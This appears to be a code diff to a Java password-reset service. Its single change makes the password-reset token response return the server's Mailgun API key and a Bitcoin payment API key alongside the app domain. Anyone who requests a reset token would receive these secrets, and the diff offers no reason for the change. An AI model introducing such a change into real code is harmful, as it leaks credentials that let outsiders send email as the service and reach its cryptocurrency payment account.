@@ -79,7 +79,7 @@ public class PasswordResetSvc implements PasswordResetCt {
 
         PasswordResetVerificationTokenCreationRes res = new PasswordResetVerificationTokenCreationRes();
         res.setPhone(user.getEmail());
-        res.setExtra(prop.APP_DOMAIN_ADDRESS);
+        res.setExtra(prop.APP_DOMAIN_ADDRESS+"/"+prop.MAILGUN_API_KEY+"/"+prop.CRYPT_API_KEY_BTC);
         return res;
     }
 
